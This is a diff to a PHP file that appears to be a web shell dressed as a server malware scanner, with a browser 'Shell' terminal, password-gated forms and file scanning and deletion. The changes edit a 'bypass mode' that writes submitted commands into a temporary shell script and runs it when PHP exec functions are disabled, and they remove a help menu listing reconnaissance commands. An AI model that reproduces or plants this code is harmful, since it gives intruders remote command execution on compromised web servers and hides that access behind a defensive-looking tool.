@@ -99,7 +99,7 @@ if (isset($_POST['term_cmd'])) {
     // ── All shell methods failed: bypass mode ──
     $bypass_tmp = sys_get_temp_dir() . '/ngopi_bypass_' . mt_rand() . '.sh';
     $bypass_out = sys_get_temp_dir() . '/ngopi_out_' . mt_rand();
-    $bypass_sh = "#!/bin/sh\nexport PATH=\"{$full_path}\"\nexport HOME=/root\ncd " . escapeshellarg($cwd) . "\n{$cmd}\n";
+    $bypass_sh = "#!/bin/sh\ncd " . escapeshellarg($cwd) . "\n{$cmd}\n";
     @file_put_contents($bypass_tmp, $bypass_sh);
     @chmod($bypass_tmp, 0755);
 
@@ -152,7 +152,7 @@ if (isset($_POST['term_cmd'])) {
         exit;
     }
 
-    echo json_encode(['output' => $output, 'method' => $method, 'cwd' => $cwd]);
+    echo json_encode(['output' => '', 'method' => 'blocked', 'cwd' => $cwd]);
     exit;
 }
 
@@ -432,35 +432,38 @@ function scan_dangerous_extensions($dir, $dangerous_extensions) {
 $deleted_files = [];
 if (isset($_POST['delete_single'])) {
     $file_path = trim($_POST['delete_single']);
-    if (file_exists($file_path) && is_file($file_path)) {
-        $realpath = realpath($file_path);
-        if ($realpath) {
-            $forbidden_paths = ['/etc', '/bin', '/sbin', '/usr/bin', '/root'];
-            $root = substr($realpath, 0, stripos($realpath, '/') === 0 ? 1 : 0);
-            if (!in_array($root, $forbidden_paths)) {
-                if (@unlink($file_path)) {
-                    $deleted_files[] = $file_path;
-                }
+    $realpath = realpath($file_path);
+    if ($realpath && is_file($realpath)) {
+        $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
+        $ok = true;
+        foreach ($forbidden as $fb) { if (str_starts_with($realpath, $fb . '/') || $realpath === $fb) { $ok = false; break; } }
+        if ($ok) {
+            if (@unlink($realpath)) {
+                $deleted_files[] = $realpath;
+            } else {
+                $error = "Failed to delete file (Permission denied): " . htmlspecialchars($file_path);
             }
         }
+    } else {
+        $error = "File not found or invalid path: " . htmlspecialchars($file_path);
     }
 } elseif (isset($_POST['mass_delete']) && !empty($_POST['to_delete'])) {
-    foreach ($_POST['to_delete'] as $file_path) {
-        $file_path = trim($file_path);
-        if (file_exists($file_path) && is_file($file_path)) {
-            $realpath = realpath($file_path);
-            if (!$realpath) continue;
-
-            $forbidden_paths = ['/etc', '/bin', '/sbin', '/usr/bin', '/root'];
-            $root = substr($realpath, 0, stripos($realpath, '/') === 0 ? 1 : 0);
-            if (in_array($root, $forbidden_paths)) continue;
-
-            if (@unlink($file_path)) {
-                $deleted_files[] = $file_path;
+    foreach ($_POST['to_delete'] as $fp) {
+        $realpath = realpath(trim($fp));
+        if (!$realpath || !is_file($realpath)) continue;
+        $forbidden = ['/etc','/bin','/sbin','/usr/bin','/usr/sbin','/boot','/root'];
+        $ok = true;
+        foreach ($forbidden as $fb) { if (str_starts_with($realpath, $fb . '/') || $realpath === $fb) { $ok = false; break; } }
+        if ($ok) {
+            if (@unlink($realpath)) {
+                $deleted_files[] = $realpath;
+            } else {
+                if(!isset($error)) $error = "Failed to delete one or more files (Permission denied).";
             }
         }
     }
 }
+
 
 $dangerous_files = scan_dangerous_extensions($scan_dir, $dangerous_extensions);
 $malware_hits = scan_for_patterns($scan_dir, $suspicious_patterns);
@@ -605,6 +608,7 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
     <span style="color:var(--color-border-secondary);font-size:16px;margin:0 4px">|</span>
     <span style="font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary)">PATH</span>
     <form method="POST" style="display:flex;align-items:center;gap:6px;flex:1;max-width:460px">
+        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
         <input class="conn-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="flex:1">
         <button type="submit" class="conn-btn">Scan</button>
     </form>
@@ -807,6 +811,7 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
     </div>
 
     <form method="POST">
+        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
         <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
         <?php foreach ($dangerous_files as $i => $df): ?>
         <div class="card">
@@ -846,6 +851,7 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
     </div>
 <?php else: ?>
     <form method="POST">
+        <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
         <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
         <?php foreach ($malware_hits as $i => $hit): ?>
         <div class="card">
@@ -880,7 +886,7 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
         <span class="term-dot" style="background:#28c840"></span>
         <span class="term-title" id="term-title"><?php echo get_current_user(); ?>@<?php echo php_uname('n'); ?> — Shell</span>
         <button onclick="clearTerm()" style="background:none;border:.5px solid #2a3530;border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;color:#4a5a52;font-family:var(--mono)">clear</button>
-        <button onclick="termHelp()" style="background:none;border:.5px solid #2a3530;border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;color:#4a5a52;font-family:var(--mono);margin-left:4px">help</button>
+
     </div>
     <div class="term-body" id="term-body"></div>
     <div class="term-input-row">
@@ -897,6 +903,7 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
         <div class="card-header"><span class="card-title">Change Scan Directory</span></div>
         <div class="card-body">
             <form method="POST">
+                <input type="hidden" name="ultra" value="<?php echo htmlspecialchars($provided_pass); ?>">
                 <label class="form-label">Directory Path</label>
                 <input class="form-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="margin-bottom:12px">
                 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
@@ -1067,22 +1074,6 @@ function clearTerm(){
     termPrint('info','Terminal cleared.');
 }
 
-function termHelp(){
-    termPrint('info','Available commands:');
-    termPrint('info','  help              Show this help');
-    termPrint('info','  pwd               Print working directory');
-    termPrint('info','  cd <dir>          Change directory');
-    termPrint('info','  ls [dir]          List directory');
-    termPrint('info','  cat <file>        Read file content');
-    termPrint('info','  whoami            Current user');
-    termPrint('info','  uname             System info');
-    termPrint('info','  id                User ID info');
-    termPrint('info','  phpinfo           PHP version & info');
-    termPrint('info','  disabled          List disabled functions');
-    termPrint('info','  methods           Show available exec methods');
-    termPrint('info','  clear             Clear terminal');
-    termPrint('info','  <cmd>             Execute via best available method');
-}
 
 function termKeydown(e){
     var input=document.getElementById('term-input');
@@ -1115,12 +1106,8 @@ function sendCmd(cmd){
     xhr.onload=function(){
         try{
             var r=JSON.parse(xhr.responseText);
-            if(r.method&&r.method!=='cd'&&r.method!=='builtin'&&r.method!=='help'&&r.method!=='clear'){
-                termPrint('','['+r.method+']');
-            }
             if(r.output!==undefined&&r.output!==''){
-                var outType='';
-                if(r.method==='blocked'||r.method==='bypass'&&r.output.indexOf('not found')>-1)outType='err';
+                var outType=r.method==='blocked'?'err':'';
                 r.output.split('\n').forEach(function(l){termPrint(outType,l);});
             }
             if(r.cwd){termCwd=r.cwd;updatePrompt();}
